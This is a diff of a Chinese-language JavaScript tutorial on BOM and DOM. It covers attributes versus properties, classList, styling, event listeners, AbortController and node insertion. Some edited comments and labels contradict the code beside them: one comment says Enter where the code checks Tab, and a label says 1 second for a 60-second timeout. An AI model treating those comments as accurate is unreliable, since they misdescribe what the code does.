@@ -7,11 +7,13 @@ tag:
   - JavaScript 程式設計（假日班）
   - PHP 資料庫網頁設計（職前班）
   - 前端網頁開發技術（職前班）
-date: 2020-04-20 21:07:53
+  - JavaScript
+  - 前端入門
+date: 2025-08-03 21:07:53
 ---
-![](assets/images/D8v3RVP.png)
+![](assets/images/banner/js.png)
 
-本篇將深入介紹 JavaScript 中最重要的兩個概念：BOM（Browser Object Model，瀏覽器物件模型）與 DOM（Document Object Model，文件物件模型）。這兩個模型是 JavaScript 與網頁互動的基礎，掌握它們將讓您能夠動態控制網頁內容和瀏覽器行為。
+本篇 BOM（Browser Object Model，瀏覽器物件模型）與 DOM（Document Object Model，文件物件模型）。這兩個模型是 JavaScript 與網頁互動的基礎，掌握它們將讓您能夠動態控制網頁內容和瀏覽器行為。
 
 <!-- more -->
 
@@ -722,61 +724,223 @@ container.innerHTML += "<p>新添加的段落</p>";
 {% endnote %}
 
 ### 屬性操作
-可以直接透過 JavaScript 來操作 HTML 元素的屬性。這包括讀取、修改和刪除屬性。以下是一些常見的屬性操作方法：
+可以直接透過 JavaScript 來操作 HTML 元素的屬性。這包括讀取、修改、檢查與刪除屬性。本節也會釐清「DOM 屬性（property）」與「HTML 屬性（attribute）」的差異，並重點說明 `getAttribute()` 與 `setAttribute()` 的使用情境。
 
+#### 常用 API 與基本示例
 ```javascript
-// demo > HTML 元素屬性
+// demo > HTML 元素屬性：基本操作
 // --------------------------------------------------
-let element = document.getElementById("title");
+const element = document.getElementById("title");
 
-// 讀取屬性
-console.log(element.id); // "title"
-console.log(element.className); // 如果有 class 的話
+// 讀取屬性（DOM 屬性 property）
+console.log(element.id);          // "title"
+console.log(element.className);   // 如有 class 會回傳字串
+
+// 讀取屬性（HTML 屬性 attribute）
+console.log(element.getAttribute("id"));    // 以標記上的原始字串為準
+console.log(element.getAttribute("class")); // 以標記上的原始字串為準（可能與當前計算後不同）
 
 // 設定屬性
-element.className = "new-class";
-element.setAttribute("data-custom", "自訂屬性值");
+element.className = "new-class";                       // 設定 DOM 屬性（通常也會反映到 attribute）
+element.setAttribute("data-custom", "自訂屬性值");   // 設定自訂資料屬性（attribute）
 
-// 移除屬性
+// 檢查與移除屬性
+console.log(element.hasAttribute("data-custom")); // true/false
 element.removeAttribute("data-custom");
 ```
+
+#### property vs attribute 的差異
+- property：JavaScript 物件屬性，反映「當下的狀態」。型別可能是字串、數字、布林等。
+- attribute：HTML 原始標記上的字串值，通常是「初始設定」。多數但非全部 attribute 會對應到 property（稱為 reflected attribute）。
+
+```javascript
+// demo > 差異示例：input 的 value 與 checked
+// --------------------------------------------------
+const input = document.querySelector("input[type='text']");
+const checkbox = document.querySelector("input[type='checkbox']");
+
+// value：property 會隨使用者輸入變動；attribute 保留初始字串
+input.setAttribute("value", "A");   // 設定初始值（標記層）
+input.value = "B";                   // 改變目前值（執行時狀態）
+console.log(input.getAttribute("value")); // "A"
+console.log(input.value);                 // "B"
+
+// checked（布林屬性）：attribute 有無即代表 true/false，property 直接是布林
+checkbox.setAttribute("checked", ""); // 只要存在就代表 true（字串內容通常不重要）
+checkbox.checked = false;                // 以執行時狀態覆寫
+console.log(checkbox.hasAttribute("checked")); // true（仍存在）
+console.log(checkbox.checked);                // false（當前狀態）
+```
+
+```javascript
+// demo > href/src 類屬性：property 可能回傳「正規化後」的值
+// --------------------------------------------------
+const link = document.querySelector("a");
+link.setAttribute("href", "../docs/page.html");
+console.log(link.getAttribute("href")); // "../docs/page.html"（原始字串）
+console.log(link.href);                  // 可能是絕對網址，如 "https://site.com/docs/page.html"
+```
+
+#### data-* 與 dataset
+- 以 `setAttribute('data-xxx', '值')` 或使用 `element.dataset.xxx = '值'`
+- `dataset` 以駝峰命名對應，例如 `data-user-id` ⇄ `dataset.userId`
+
+```javascript
+// demo > 操作 data-* 屬性
+// --------------------------------------------------
+const card = document.querySelector(".card");
+card.setAttribute("data-user-id", "123");
+console.log(card.getAttribute("data-user-id")); // "123"
+
+card.dataset.role = "admin";              // 等同於 setAttribute('data-role', 'admin')
+console.log(card.dataset.role);            // "admin"
+```
+
+{% note warning %}
+**布林屬性注意：** `disabled`、`checked`、`required` 等建議用「property」布林切換，如 `element.disabled = true/false`。用 `setAttribute('disabled', '')` 只是在標記上加上屬性，與執行時狀態可能不同步。
+{% endnote %}
+
+#### 何時用 property，何時用 get/setAttribute？
+- 使用 property（如 `id`、`value`、`checked`、`className`、`classList`）：
+  - 需要操作「執行時狀態」或布林屬性
+  - 需要方便的 API 與型別安全（非全為字串）
+- 使用 `getAttribute`/`setAttribute`：
+  - 操作 `data-*`、`aria-*` 或非反映到 property 的自訂屬性
+  - 需要取得「原始標記」字串（如 `href` 原始寫法、大小寫）
+  - 大量動態組合屬性字串（例如 `setAttribute('style', cssText)`）
+
+```javascript
+// demo > class 與 style 的差別操作
+// --------------------------------------------------
+const box = document.querySelector(".box");
+
+// class 建議：classList / className
+box.classList.add("active");
+box.className = "card active";
+
+// style：若要部分修改，優先用 property；要一次覆蓋才用 setAttribute('style', ...)
+box.style.backgroundColor = "#fee";
+box.setAttribute("style", "color:#333; padding:12px;"); // 覆蓋整個 style 屬性
+```
+
+{% note info %}
+**小技巧：** `hasAttribute(name)` 可用來檢查 attribute 是否存在；`removeAttribute(name)` 用以移除指定屬性。`getAttribute(name)` 找不到時回傳 `null`，請記得判斷。
+{% endnote %}
+
+{% note danger %}
+**安全性提醒：** 避免用 `setAttribute('onclick', '...')` 這類事件屬性綁定事件，容易造成 XSS 風險。請使用 `element.addEventListener()`。
+{% endnote %}
+
+#### 常見的 classList 操作
+`classList` 提供便捷的類別管理 API，適合做狀態切換、條件套用與多類別增減。
+
+```javascript
+// demo > classList 常見操作
+// --------------------------------------------------
+const box = document.querySelector('.box');
+
+// add/remove：可一次處理多個 class
+box.classList.add('active', 'highlight');
+box.classList.remove('highlight');
+
+// toggle：沒有第二參數時，會在有/無之間切換
+box.classList.toggle('open');
+
+// toggle(force)：用布林強制加入/移除（不會依現況翻轉）
+const isMobile = window.matchMedia('(max-width: 768px)').matches;
+box.classList.toggle('compact', isMobile);
+
+// contains：檢查是否已有某個 class
+if (!box.classList.contains('active')) {
+  box.classList.add('active');
+}
+
+// replace：以新 class 取代舊 class
+box.classList.replace('active', 'is-active');
+```
+
+{% note info %}
+**建議用法：** 處理單一/多個類別的增減與狀態切換時，優先使用 `classList`；需要完整覆蓋全部類別時，才使用 `element.className = '...'` 或 `setAttribute('class', '...')`。
+{% endnote %}
+
+#### 其他常見屬性操作
+以下整理幾組常見但容易忽略的屬性操作情境：
+
+```javascript
+// demo > 通用方法：toggleAttribute / hasAttributes / getAttributeNames
+// --------------------------------------------------
+const el = document.querySelector('#panel');
+
+// 直接切換布林屬性（存在=on，不存在=off）
+el.toggleAttribute('hidden');        // 在顯示/隱藏之間切換
+el.toggleAttribute('hidden', false); // 強制移除（顯示）
+
+console.log(el.hasAttributes());       // 是否有任意屬性
+console.log(el.getAttributeNames());   // 取得所有屬性名稱陣列
+```
+
+```javascript
+// demo > tabindex：屬性 vs 屬性值型別
+// --------------------------------------------------
+const card = document.querySelector('.card');
+card.setAttribute('tabindex', '-1'); // attribute（字串）
+card.tabIndex = 0;                   // property（數字），可參與自然鍵盤導航
+```
+
+```javascript
+// demo > 無障礙（ARIA）與 role
+// --------------------------------------------------
+const toggleBtn = document.querySelector('#toggle');
+// 以 ARIA 反映狀態給協助工具
+const pressed = toggleBtn.getAttribute('aria-pressed') === 'true';
+toggleBtn.setAttribute('aria-pressed', String(!pressed));
+// 補上語意（若非 <button> 元素）
+toggleBtn.setAttribute('role', 'button');
+```
+
+```javascript
+// demo > 布林屬性：hidden / disabled
+// --------------------------------------------------
+const input = document.querySelector('#name');
+input.disabled = true;                 // 建議用 property 切換
+// 或使用 attribute 的切換語法
+input.toggleAttribute('disabled', false);
+```
+
+```javascript
+// demo > 連結安全性與使用者體驗
+// --------------------------------------------------
+const link = document.querySelector('a[target="_blank"]');
+link.setAttribute('rel', 'noopener noreferrer'); // 避免反向操作與安全風險
+```
+
+```javascript
+// demo > 圖片載入與可存取性
+// --------------------------------------------------
+const img = document.querySelector('img.hero');
+img.alt = '活動主視覺：夏季特賣';
+img.loading = 'lazy';                 // 延遲載入
+img.decoding = 'async';               // 非阻塞解碼
+// 若需響應式來源：
+img.setAttribute('srcset', '/img/hero-640.jpg 640w, /img/hero-1280.jpg 1280w');
+img.setAttribute('sizes', '(max-width: 768px) 640px, 1280px');
+```
+
+{% note warning %}
+**提醒：** 設定 `target="_blank"` 記得加上 `rel="noopener noreferrer"`；`tabindex` 請避免過度自訂正整數，優先使用自然 DOM 流或 `tabindex="-1"` 搭配程式聚焦。
+{% endnote %}
 
 ### 樣式操作
 DOM 提供了多種方式來設定元素的 CSS 樣式，每種方法都有其適用場景：
 
-| 方法              | 特點                             | 適用場景             |
-| ----------------- | -------------------------------- | -------------------- |
-| `element.style.*` | 精確控制 style，不會影響其他樣式 | 單一屬性修改         |
-| `element.style`   | 完全覆蓋 style 所有樣式          | 需要重新設定所有樣式 |
-| Object.assign()   | 批量設定，程式碼簡潔             | 需要設定多個相關樣式 |
-| cssText           | 一次性設定，效能較好             | 大量樣式設定         |
-| setProperty()     | 支援 CSS 變數和複雜值            | CSS 變數和特殊屬性   |
-| setAttribute()    | 使用字串設定，靈活性高           | 動態組合樣式         |
-
-{% note warning %}
-**重要提醒：**
-- 直接設定 `element.style = "css 字串"` 會覆蓋元素的所有現有樣式
-- 如果需要保留某些樣式，建議使用 `cssText` 或 `Object.assign()`
-- `setAttribute("style", "css 字串")` 也會完全覆蓋現有樣式
-- 在複雜的樣式操作中，建議先備份原有樣式
-{% endnote %}
-
-{% note info %}
-**最佳實踐：**
-- 單一屬性修改使用 `element.style.property = value`
-- 多個相關樣式使用 `Object.assign()` 或 `cssText`
-- 需要動態組合樣式時使用 `setAttribute()`
-- CSS 變數操作使用 `setProperty()`
-- 完全重新設定樣式時使用直接賦值或 `setAttribute()`
-{% endnote %}
-
-{% note info %}
-**setAttribute vs style 物件：**
-- `setAttribute("style", "css 字串")` - 完全覆蓋所有樣式
-- `element.style.property = value` - 精確控制單一屬性
-- 選擇哪種方法取決於具體需求
-{% endnote %}
-
+| 方法                     | 特色與優點                            | 適用情境          | 補充說明                                                          |
+| ------------------------ | ------------------------------------- | ----------------- | ----------------------------------------------------------------- |
+| `element.style.property` | 精確、直觀，僅影響單一 CSS 屬性       | 單一屬性修改      | 建議用於只需變更一個樣式屬性時，安全不影響其他樣式                |
+| `element.style`          | 直接覆蓋所有 style，重設樣式          | 全部樣式重設      | 會移除原有所有樣式，適合完全重設或清空，需小心避免覆蓋重要樣式    |
+| `Object.assign()`        | 批量設定多個 style 屬性，語法簡潔     | 多屬性批次修改    | 同時變更多個屬性且希望保留物件型態，適合動態樣式切換              |
+| `style.cssText`          | 一次性設定全部樣式，效能佳            | 大量樣式設定      | 會覆蓋原有 style，適合一次性設定多個樣式但要注意樣式遺失          |
+| `style.setProperty()`    | 支援 CSS 變數、`!important`、複雜屬性 | CSS 變數/特殊屬性 | 操作 CSS 原生變數、`!important` 或特殊屬性時最推薦，彈性最高      |
+| `setAttribute()`         | 以 HTML 字串設定 style，靈活組合      | 動態組合/外部整合 | 適合根據條件組合 style 字串，或與外部樣式系統整合，易覆蓋全部樣式 |
 
 以下是表格中提到的所有方法的完整範例：
 
@@ -836,36 +1000,47 @@ element.setAttribute("style", styles);
 ```
 
 {% note info %}
-**各方法特點總結：**
-- **element.style.*** - 最精確，適合單一屬性修改
-- **element.style** - 完全覆蓋，適合重新設定所有樣式
-- **Object.assign()** - 程式碼簡潔，適合批量設定
-- **cssText** - 效能最佳，適合大量樣式設定
-- **setProperty()** - 功能最強，支援 CSS 原生變數和 important
-- **setAttribute()** - 靈活性最高，適合動態組合樣式
+**setAttribute vs style 物件：**
+- `setAttribute("style", "css 字串")` - 完全覆蓋所有樣式
+- `element.style.property = value` - 精確控制單一屬性
+- 選擇哪種方法取決於具體需求
+{% endnote %}
+
+{% note warning %}
+**重要提醒：**
+- 直接設定 `element.style = "css 字串"` 會覆蓋元素的所有現有樣式
+- 如果需要保留某些樣式，建議使用 `cssText` 或 `Object.assign()`
+- `setAttribute("style", "css 字串")` 也會完全覆蓋現有樣式
+- 在複雜的樣式操作中，建議先備份原有樣式
 {% endnote %}
 
 ## 事件處理
-
 事件處理是 JavaScript 與用戶互動的核心機制。透過事件處理，我們可以響應用戶的各種操作，如點擊、滑鼠移動、鍵盤輸入等。JavaScript 可以監聽這些事件並執行相應的程式碼。
 
-| 事件類型   | 事件名稱    | 描述         |
-| ---------- | ----------- | ------------ |
-| 滑鼠事件   | `click`     | 點擊元素     |
-| 滑鼠事件   | `dblclick`  | 雙擊元素     |
-| 滑鼠事件   | `mouseover` | 滑鼠移入     |
-| 滑鼠事件   | `mouseout`  | 滑鼠移出     |
-| 鍵盤事件   | `keydown`   | 按下按鍵     |
-| 鍵盤事件   | `keyup`     | 放開按鍵     |
-| 表單事件   | `change`    | 內容改變     |
-| 表單事件   | `submit`    | 表單提交     |
-| 瀏覽器事件 | `load`      | 頁面載入完成 |
+| 類別      | 事件名（常用）                                                                                                        | 描述                                       |
+| --------- | --------------------------------------------------------------------------------------------------------------------- | ------------------------------------------ |
+| 滑鼠      | click, dblclick, mousedown, mouseup, mouseenter, mouseleave, mouseover, mouseout, contextmenu                         | 點擊、按下/放開、移入/移出、右鍵選單       |
+| 指標      | pointerdown, pointerup, pointermove, pointerenter, pointerleave, pointercancel, gotpointercapture, lostpointercapture | 統一滑鼠/觸控/手寫筆的事件介面             |
+| 觸控      | touchstart, touchmove, touchend, touchcancel                                                                          | 行動裝置觸控事件                           |
+| 鍵盤      | keydown, keyup                                                                                                        | 鍵盤按下/放開（`keypress` 已不推薦）       |
+| 表單      | input, change, submit, reset                                                                                          | 輸入改變、提交、重設                       |
+| 焦點      | focus, blur, focusin, focusout                                                                                        | 取得/失去焦點（`focusin/out` 會冒泡）      |
+| 剪貼簿    | copy, cut, paste                                                                                                      | 複製、剪下、貼上                           |
+| 拖放      | dragstart, drag, dragend, dragenter, dragleave, dragover, drop                                                        | HTML5 拖放事件                             |
+| 滾動/視窗 | scroll, resize                                                                                                        | 捲動、視窗尺寸改變（請節流/防抖）          |
+| 媒體      | play, pause, ended, timeupdate, volumechange, loadeddata                                                              | `<audio>`/`<video>` 媒體播放相關           |
+| 網路/頁面 | load, DOMContentLoaded, beforeunload, unload, online, offline                                                         | 載入完成、DOM 就緒、離開頁面、網路連線變化 |
+| DOM 改動  | mutation（透過 MutationObserver）                                                                                     | 監聽節點/屬性/文字改變                     |
+
+{% note info %}
+更完整清單可參考 MDN Events 目錄；本表列常用事件做快速索引。建議優先使用 Pointer Events 以統一滑鼠與觸控行為。
+{% endnote %}
 
 ### 事件處理方法
 
 JavaScript 提供了多種方式來綁定事件處理器，每種方法都有其優缺點。從簡單的 HTML 屬性到現代的 `addEventListener` 方法，我們需要根據具體需求選擇合適的方法。
 
-#### 方法一：HTML 屬性
+#### HTML 屬性方法
 ```html
 <button onclick="showMessage()">點擊我</button>
 <input type="text" onchange="handleChange(this.value)">
@@ -895,18 +1070,18 @@ function handleChange(value) {
 - 安全性較差（可能被 XSS 攻擊）
 {% endnote %}
 
-#### 方法二：JavaScript 綁定
+#### JavaScript 綁定方法
 ```html
 <button id="myButton">點擊我</button>
 <input type="text" id="myInput">
 
 <script>
 // 獲取元素
-let button = document.getElementById("myButton");
+let btn = document.getElementById("myButton");
 let input = document.getElementById("myInput");
 
 // 綁定事件
-button.onclick = function() {
+btn.onclick = function() {
     alert("按鈕被點擊了！");
 };
 
@@ -929,7 +1104,7 @@ input.onchange = function() {
 - 不支援事件委派
 {% endnote %}
 
-#### 方法三：addEventListener（推薦）
+#### addEventListener 方法（推薦）
 ```html
 <button id="myButton">點擊我</button>
 
@@ -952,18 +1127,18 @@ button.addEventListener("click", function() {
 **addEventListener 方法的優缺點：**
 **優點：**
 - 可以綁定多個事件處理器
-- 支援事件委派
-- 更好的錯誤處理
-- 可以控制事件捕獲和冒泡階段
-- 更容易維護和除錯
-- 符合現代 JavaScript 最佳實踐
+- 支援事件捕獲、選項（如 once、passive、signal）
+- 更彈性，易維護且支援事件委派
 
 **缺點：**
-- 語法稍微複雜
-- 需要記住正確的事件名稱（如 "click" 而不是 "onclick"）
+- 需要保留處理器參考，才能正確移除
 {% endnote %}
 
-當需要移除事件處理器時，必須使用 `removeEventListener` 方法：
+### addEventListener 的解除事件綁定
+當事件不再需要時，應適時解除以避免記憶體占用與重複觸發。
+
+#### removeEventListener
+當需要移除事件處理器時，必須使用 `removeEventListener` 方法
 
 ```html
 <button id="myButton">點擊我</button>
@@ -997,6 +1172,53 @@ removeBtn.addEventListener("click", function() {
 - 在組件卸載或頁面切換時特別重要
 {% endnote %}
 
+#### AbortController
+使用 AbortController 控制多個監聽，一次中止
+
+```html
+<button id="btnAbort">點我，1 秒後自動解除監聽</button>
+
+<script>
+const btnAbort = document.getElementById('btnAbort');
+const controller = new AbortController();
+const { signal } = controller;
+
+btnAbort.addEventListener('click', () => console.log('A'), { signal });
+btnAbort.addEventListener('click', () => console.log('B'), { signal });
+
+setTimeout(() => controller.abort(), 60000); // 60 秒後自動解除所有以該 signal 綁定的監聽
+</script>
+```
+
+{% note info %}
+**什麼是 AbortController / 為何抽取 signal？**
+- AbortController 是瀏覽器提供的「取消控制器」，用來中止支援取消的操作（如 `addEventListener`、`fetch`）。
+- `signal` 是「取消通知的載具」。把 `controller.signal` 傳給多個 API 後，呼叫 `controller.abort()` 便能一次性中止或自動解除所有綁定該 `signal` 的操作。
+- 抽取 `signal`（`const { signal } = controller`）僅為語法便利，等同於多處使用 `controller.signal`；好處是「群組化管理生命週期」。
+- 同一個 controller 只能 abort 一次；`signal.aborted` 會變為 `true` 並觸發 `abort` 事件；若需再次使用，請新建 controller。
+- 常見用途在元件卸載、路由切換時，統一清理事件監聽或中止請求。
+{% endnote %}
+
+#### once time
+使用 once：自動執行一次後解除 
+```html
+<button id="btnOnce">只觸發一次</button>
+
+<script>
+const btnOnce = document.getElementById('btnOnce');
+btnOnce.addEventListener('click', () => {
+  console.log('只會出現一次');
+}, { once: true });
+</script>
+```
+
+{% note info %}
+**重點：**
+- `removeEventListener` 必須傳入與 `addEventListener` 完全相同的參數（事件名、同一個回呼函式參考、相同的選項/捕獲旗標）
+- 使用 `AbortController` 的 `signal` 可批次管理監聽生命週期
+- 使用 `{ once: true }` 可在首次觸發後自動解除，無須手動移除
+{% endnote %}
+
 ### event 物件
 事件處理器會自動接收一個 event 物件，包含事件的詳細資訊。這個事件物件提供了豐富的屬性和方法，讓我們能夠深入了解事件的發生情況和相關資訊。
 
@@ -1013,6 +1235,7 @@ removeBtn.addEventListener("click", function() {
 | `event.ctrlKey`           | Ctrl 鍵是否按下                   | 組合鍵檢測             |
 | `event.shiftKey`          | Shift 鍵是否按下                  | 組合鍵檢測             |
 | `event.altKey`            | Alt 鍵是否按下                    | 組合鍵檢測             |
+| `event.timeStamp`         | 事件觸發的時間戳（毫秒）          | 記錄事件發生時間       |
 | `event.preventDefault()`  | 阻止預設行為                      | 表單提交、連結跳轉控制 |
 | `event.stopPropagation()` | 阻止事件冒泡                      | 事件傳播控制           |
 
@@ -1020,13 +1243,13 @@ removeBtn.addEventListener("click", function() {
 
 前面我們學習了三種事件綁定方式，現在讓我們看看每種方式如何獲取和使用事件物件：
 
-##### 方法一：HTML 屬性方式
+##### HTML 屬性方法
 
 ```html
 <button onclick="handleClick(event)">點擊我</button>
 <input type="text" onchange="handleChange(event)">
 <input type="text" onkeydown="handleKeyDown(event)">
-
+<a href="https://example.com" onclick="handleLink(event)">前往外部連結（阻止跳轉）</a>
 <script>
 // HTML 屬性方式需要手動傳遞 event 參數
 function handleClick(event) {
@@ -1045,15 +1268,19 @@ function handleKeyDown(event) {
     console.log("按下的鍵：" + event.key);
     console.log("鍵碼：" + event.keyCode);
     
-    // 阻止 Enter 鍵的預設行為
-    if (event.key === 'Enter') {
+    // 阻止 Enter 鍵的預設行為（例如避免表單提交）
+    if (event.key === 'Tab') {
         event.preventDefault();
-        console.log("已阻止 Enter 鍵的預設行為");
+        console.log("已阻止 Tab 鍵的預設行為（離開此框）");
     }
+}
+
+function handleLink(event) {
+  event.preventDefault();
+  console.log("已阻止連結跳轉，改為執行自訂邏輯（例如開啟 modal）");
 }
 </script>
 ```
-
 {% note info %}
 **HTML 屬性方式特點：**
 - 必須手動傳遞 `event` 參數
@@ -1061,7 +1288,7 @@ function handleKeyDown(event) {
 - 事件物件會自動傳入，但需要在函數參數中接收
 {% endnote %}
 
-##### 方法二：JavaScript 綁定方式
+##### JavaScript 綁定方法
 
 ```html
 <button id="myButton">點擊我</button>
@@ -1088,10 +1315,10 @@ input.onkeydown = function(event) {
     console.log("按下的鍵：" + event.key);
     console.log("鍵碼：" + event.keyCode);
     
-    // 阻止 Enter 鍵的預設行為
-    if (event.key === 'Enter') {
+    // 阻止 Tab 鍵的預設行為
+    if (event.key === 'Tab') {
         event.preventDefault();
-        console.log("已阻止 Enter 鍵的預設行為");
+        console.log("已阻止 Tab 鍵的預設行為");
     }
 };
     </script>
@@ -1104,7 +1331,7 @@ input.onkeydown = function(event) {
 - 不需要手動傳遞 event 參數
 {% endnote %}
 
-##### 方法三：addEventListener 方式（推薦）
+##### addEventListener 方法
 
 ```html
 <button id="myButton">點擊我</button>
@@ -1132,10 +1359,10 @@ input.addEventListener("keydown", function(event) {
     console.log("按下的鍵：" + event.key);
     console.log("鍵碼：" + event.keyCode);
     
-    // 阻止 Enter 鍵的預設行為
-    if (event.key === 'Enter') {
+    // 阻止 Tab 鍵的預設行為
+    if (event.key === 'Tab') {
         event.preventDefault();
-        console.log("已阻止 Enter 鍵的預設行為");
+        console.log("已阻止 Tab 鍵的預設行為");
     }
 });
 
@@ -1154,25 +1381,6 @@ button.addEventListener("click", function(event) {
 - 可以綁定多個事件處理器
 - 支援事件委派
 - 提供 `currentTarget` 屬性區分事件委派
-{% endnote %}
-
-#### 三種方式的對比
-
-| 特性           | HTML 屬性方式 | JavaScript 綁定 | addEventListener |
-| -------------- | ------------- | --------------- | ---------------- |
-| 事件物件傳遞   | 需手動傳遞    | 自動傳入        | 自動傳入         |
-| 多個處理器支援 | ❌             | ❌               | ✅                |
-| 事件委派支援   | ❌             | ❌               | ✅                |
-| 程式碼分離     | ❌             | ✅               | ✅                |
-| 維護性         | 差            | 中等            | 好               |
-| 現代開發推薦   | ❌             | ❌               | ✅                |
-
-{% note warning %}
-**重要提醒：**
-- HTML 屬性方式是唯一需要手動傳遞 `event` 參數的方式
-- JavaScript 綁定和 addEventListener 都會自動傳入事件物件
-- 現代開發推薦使用 addEventListener 方式
-- 事件物件在所有方式中都是相同的，包含相同的屬性和方法
 {% endnote %}
 
 #### 實際應用範例
@@ -1287,19 +1495,24 @@ document.addEventListener('keydown', function (event) {
     flex-direction: column;
     align-items: center;
         }
-    </style>
 
+  #error-message {
+    color: red;
+    font-size: 14px;
+    margin-top: 5px;
+    display: none;
+  }
+</style>
     <form id="myForm">
   <fieldset>
     <legend>Enter your email</legend>
         <div class="form-group">
       <input type="email" id="email" placeholder="Enter your email">
-      <div id="error-message" style="color: red; font-size: 14px; margin-top: 5px; display: none;"></div>
+      <div id="error-message"></div>
         </div>
     <button type="submit">Submit</button>
   </fieldset>
 </form>
-
 <script>
   const emailInput = document.getElementById('email');
   const errorMessage = document.getElementById('error-message');
@@ -1312,33 +1525,35 @@ document.addEventListener('keydown', function (event) {
     if (email === '') {
       // 如果為空，隱藏錯誤訊息
       errorMessage.style.display = 'none';
+      errorMessage.textContent = '';
       return;
     }
 
-    if (!emailRegex.test(email)) {
-      errorMessage.textContent = '請輸入有效的電子郵件地址';
-      errorMessage.style.display = 'block';
-    } else {
-      // 驗證通過，隱藏錯誤訊息
-      errorMessage.style.display = 'none';
-    }
+    const isValid = emailRegex.test(email);
+    errorMessage.textContent = isValid ? '' : '請輸入有效的電子郵件地址';
+    errorMessage.style.display = isValid ? 'none' : 'block';
   });
 
   // 表單提交時的驗證
   document.getElementById('myForm').addEventListener('submit', function (event) {
-    const email = emailInput.value.trim();
+    const email = emailInput.value.trim();  // trim 可以去除字串兩端的空白字元
 
-    if (email === '' || !emailRegex.test(email)) {
+    if (!email) {  // 如果 email 為空，阻止表單提交，並顯示錯誤訊息
       event.preventDefault();
-      if (email === '') {
         errorMessage.textContent = '請輸入電子郵件地址';
-      } else {
-        errorMessage.textContent = '請輸入有效的電子郵件地址';
+      errorMessage.style.display = 'block';
+      return false;
       }
+
+    if (!emailRegex.test(email)) {  // 如果 email 不符合正規表示式，阻止表單提交，並顯示錯誤訊息
+      event.preventDefault();
+      errorMessage.textContent = '請輸入有效的電子郵件地址';
       errorMessage.style.display = 'block';
       return false;
     }
 
+    errorMessage.textContent = '';  // 清空錯誤訊息
+    errorMessage.style.display = 'none';  // 隱藏錯誤訊息
     console.log('表單驗證通過，準備提交');
   });
     </script>
@@ -1694,66 +1909,458 @@ style Phase3 fill:#e8f5e8,stroke:#388e3c,stroke-width:2px
 {% endnote %}
 
 ## DOM 節點操作
-在掌握了基礎的 DOM 操作後，我們可以進一步學習一些進階概念。這些概念將幫助您更深入地理解 DOM 的運作機制，並能夠處理更複雜的網頁互動需求。
+在掌握了事件與內容/屬性操作後，這一節完整介紹如何「新增、插入、移除與遍歷」DOM 節點，並給出實務建議與常見陷阱。在開始前，先建立一個重要觀念：這些 API 分成「ES5 傳統」與「ES6+ 現代」兩類。兩者可混用，但現代方法語法更直覺。
 
-### 創建新元素
+- ES5（傳統，普遍支援）：適用於舊專案或需要與老舊環境相容
+| 方法              | 功能說明         | 適用類型 | 範例                                    |
+| ----------------- | ---------------- | -------- | --------------------------------------- |
+| `createElement()` | 建立新節點       | Node     | `document.createElement('li')`          |
+| `appendChild()`   | 加入子節點（尾） | Node     | `parent.appendChild(node)`              |
+| `replaceChild()`  | 替換子節點       | Node     | `parent.replaceChild(newNode, oldNode)` |
+| `insertBefore()`  | 指定位置插入     | Node     | `parent.insertBefore(newNode, refNode)` |
+| `removeChild()`   | 移除子節點       | Node     | `parent.removeChild(childNode)`         |
+
+- ES6+（現代，建議優先）：語法更簡潔、彈性更高，支援多個節點或字串同時插入
+| 方法                | 插入/操作位置                                                        | 多參數支援 | 適用類型                          | 範例                                       |
+| ------------------- | -------------------------------------------------------------------- | ---------- | --------------------------------- | ------------------------------------------ |
+| `append()`          | 內部尾端                                                             | ✅          | Node / string                     | `parent.append(node1, '文字', node2)`      |
+| `prepend()`         | 內部開頭                                                             | ✅          | Node / string                     | `parent.prepend(node1, '文字', node2)`     |
+| `before()`          | 同層前方                                                             | ✅          | Node / string                     | `ref.before(node1, '文字', node2)`         |
+| `after()`           | 同層後方                                                             | ✅          | Node / string                     | `ref.after(node1, '文字', node2)`          |
+| `replaceWith()`     | 同層取代                                                             | ✅          | Node / string                     | `ref.replaceWith(node1, '文字', node2)`    |
+| `insertAdjacent*()` | 相鄰錨點，指定 beforebegin, afterbegin, beforeend, afterend 插入類型 | -          | 依 `*` 定義 HTML, Element, string | `el.insertAdjacentHTML('beforeend', html)` |
+| `remove()`          | 自身移除                                                             | -          | Node                              | `node.remove()`                            |
+
+{% note info %}
+**怎麼選？**
+DOM 的插入方法分為傳統與現代兩大類。早期僅有 `appendChild`、`insertBefore` 等屬於較舊的 API；自 ES2015（ES6）起，瀏覽器陸續支援 `append`、`prepend`、`before`、`after` 等現代方法，語法更簡潔、彈性更高。
+
+- 新專案：優先 ES6+ 等價替代的現代方法；可讀性與生產力更好，而 `createElement()` 仍是現在標準 API。
+- 舊專案/相容性：使用 `appendChild/insertBefore/removeChild/replaceChild` 等 ES5 方法。
+
+無論哪種：插入的是「搬移」既有節點；若要保留原件，請 `cloneNode(true)`。
+{% endnote %}
+
+### 新增與插入
+JavaScript 能夠動態建立新的 DOM 節點，並依需求插入到網頁中任何指定的位置，讓網頁內容可以即時更新與互動。
+
 ```javascript
-// 創建新的 div 元素
-let newDiv = document.createElement("div");
-newDiv.textContent = "新創建的元素";
-newDiv.className = "new-element";
+const card = document.createElement('div');
+card.className = 'card';
 
-// 添加到頁面
-document.body.appendChild(newDiv);
+const title = document.createElement('h3');
+title.textContent = '最新公告';
+
+const desc = document.createElement('p');
+desc.textContent = '本週五系統維護，請提前完成作業。';
+
+// 1) 產生一個 a 連結節點並插入到 card 內
+const link = document.createElement('a'); // 建立 a 標籤
+link.href = 'https://www.google.com/';           // 設定連結目標網址
+link.textContent = '前往 Google 網站';   // 設定連結文字
+link.target = '_blank';                   // 新分頁開啟
+
+card.append(title, desc, link); // 一次插入標題、描述與連結
+
+// 將 card 插入到畫面上（例如 body）
+document.body.append(card);
 ```
 
-### 移除元素
+### 移動與複製
+當你建立一個新的 DOM 節點時，這個節點在記憶體中只有一份。如果你嘗試將同一個節點插入到多個位置，瀏覽器會直接將它「搬移」到新的位置，而不是複製一份。因此，若要在多個地方出現相同結構，必須使用 `cloneNode()` 方法來複製節點。
+
 ```javascript
-// 移除指定元素
-let elementToRemove = document.getElementById("elementToRemove");
-if (elementToRemove) {
-    elementToRemove.parentNode.removeChild(elementToRemove);
+const ul = document.createElement('ul');
+
+const listItem1 = document.createElement('li');
+listItem1.textContent = '項目 1';
+
+ul.append(listItem1); // append 可同時插入多個節點或字串，無回傳值
+
+const listItem2 = document.createElement('li');
+listItem2.textContent = '項目 2';
+// ul.append(listItem2, listItem1); // 項目 1 DOM 同一個會被重新移動-> 2, 1
+
+const listItem3 = listItem1.cloneNode(); // 複製 listItem1 的 DOM 結構，不包含 textContent
